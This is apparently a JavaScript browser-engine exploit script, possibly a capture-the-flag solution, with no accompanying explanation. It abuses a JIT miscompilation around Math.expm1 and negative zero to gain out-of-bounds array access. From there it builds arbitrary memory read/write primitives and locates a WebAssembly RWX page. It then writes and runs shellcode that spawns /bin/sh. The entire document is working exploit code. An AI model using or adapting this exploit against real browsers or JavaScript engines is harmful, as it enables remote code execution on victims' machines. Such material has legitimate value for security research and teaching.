let CONVERSION = new ArrayBuffer(0x8);
let f64 = new Float64Array(CONVERSION);
let i64 = new BigUint64Array(CONVERSION);

BigInt.prototype.hex = function() { return "0x" + this.toString(16); }
BigInt.prototype.i2f = function() { i64[0] = this; return f64[0]; }
BigInt.prototype.i32 = function() { return this & 0xFFFFFFFFn; }
Number.prototype.hex = function() { f64[0] = this; return "0x" + i64[0].toString(16); }
Number.prototype.f2i = function() { f64[0] = this; return i64[0]; }

function trigger(x) {
    let o = {mz: -0}
    let idx = Object.is(Math.expm1(x), o.mz);
    let arr = [1.1, 2.2];
    let oob = [13.37, 13.37];

    arr[idx * 8] += (0x100000000000n).i2f();
    return [oob, arr];
}

trigger(0);
for(let i = 0; i < 0x10000; i++)
    trigger("0");
let oob = trigger(-0)[0];

function pwn() {
    if(oob.length < 0x100)
        return;

    let boxed = [{}, {}];
    let unboxed = [1.1, 2.2];

    let addrof = function(obj) {
        boxed[0] = obj;
        return oob[14].f2i().i32();
    }

    let fakeobj = function(addr) {
        oob[14] = addr.i2f();
        return boxed[0];
    }

    let read64 = function(addr) {
        oob[28] = ((addr - 0x8n) | (0x4n << 32n)).i2f();
        return unboxed[0].f2i();
    }

    let write64 = function(addr, value) {
        oob[28] = ((addr - 0x8n) | (0x4n << 32n)).i2f();
        unboxed[0] = value.i2f();
    }

    let ab = new ArrayBuffer(0x100);

    const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,139,128,128,128,0,1,133,128,128,128,0,0,65,185,10,11]);
    const wasmInstance = new WebAssembly.Instance(new WebAssembly.Module(wasmCode), {});
    const shell = wasmInstance.exports.main;

    rwxaddr = read64(addrof(shell) - 0x60n);
    console.log("[+] RWX Addr: " + rwxaddr.hex());
    write64(addrof(ab) + 0x1cn, rwxaddr);

    const shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";
    let dv = new DataView(ab);
    for(let i = 0; i < shellcode.length; i++)
        dv.setUint8(i, shellcode.charCodeAt(i));

    shell();
}

pwn();
